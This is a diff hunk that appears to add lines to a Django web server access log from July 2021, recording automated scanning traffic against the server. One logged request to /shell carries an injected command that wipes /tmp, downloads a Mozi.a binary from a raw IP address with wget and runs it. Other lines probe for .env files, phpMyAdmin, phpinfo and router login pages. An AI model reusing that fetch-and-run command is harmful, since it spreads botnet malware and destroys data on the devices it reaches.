@@ -896,3 +896,42 @@ Not Found: /favicon.ico
 [05/Jul/2021 22:44:42] "GET /admin/jsi18n/ HTTP/1.0" 200 8330
 Not Found: /favicon.ico
 [05/Jul/2021 22:44:42] "GET /favicon.ico HTTP/1.0" 404 2108
+Not Found: /shell
+[05/Jul/2021 23:23:22] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://180.188.251.252:47522/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 2182
+Not Found: /phpmyadmin/index.php
+[06/Jul/2021 00:05:39] "GET /phpmyadmin/index.php HTTP/1.0" 404 2135
+Not Found: /phpMyAdmin/index.php
+[06/Jul/2021 00:05:39] "GET /phpMyAdmin/index.php HTTP/1.0" 404 2135
+[06/Jul/2021 00:16:56] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 01:08:27] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 01:11:35] "GET / HTTP/1.0" 200 10773
+Not Found: /.env
+[06/Jul/2021 01:12:11] "GET /.env HTTP/1.0" 404 2087
+[06/Jul/2021 01:12:12] "POST / HTTP/1.0" 200 10773
+Not Found: /.env
+[06/Jul/2021 01:33:57] "GET /.env HTTP/1.0" 404 2087
+[06/Jul/2021 01:33:58] "POST / HTTP/1.0" 200 10773
+[06/Jul/2021 02:28:05] "POST / HTTP/1.0" 200 10773
+Not Found: /.env
+[06/Jul/2021 02:28:06] "GET /.env HTTP/1.0" 404 2087
+[06/Jul/2021 02:29:50] "GET / HTTP/1.0" 200 10773
+Not Found: /_profiler/phpinfo
+[06/Jul/2021 02:31:35] "GET /_profiler/phpinfo HTTP/1.0" 404 2126
+[06/Jul/2021 04:26:45] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 04:51:35] "GET / HTTP/1.0" 200 10773
+Not Found: /config/getuser
+[06/Jul/2021 04:59:57] "GET /config/getuser?index=0 HTTP/1.0" 404 2125
+Not Found: /boaform/admin/formLogin
+[06/Jul/2021 05:23:40] "POST /boaform/admin/formLogin HTTP/1.0" 404 2145
+[06/Jul/2021 05:34:06] "GET / HTTP/1.0" 200 10773
+Not Found: /webfig/
+[06/Jul/2021 05:34:06] "GET /webfig/ HTTP/1.0" 404 2096
+[06/Jul/2021 06:03:04] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 06:58:32] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 06:58:32] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 07:02:52] "GET / HTTP/1.0" 200 10773
+Not Found: /boaform/admin/formLogin
+[06/Jul/2021 07:06:12] "POST /boaform/admin/formLogin HTTP/1.0" 404 2145
+[06/Jul/2021 07:07:02] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 07:47:45] "GET / HTTP/1.0" 200 10773
+[06/Jul/2021 07:47:46] "GET / HTTP/1.0" 200 10773
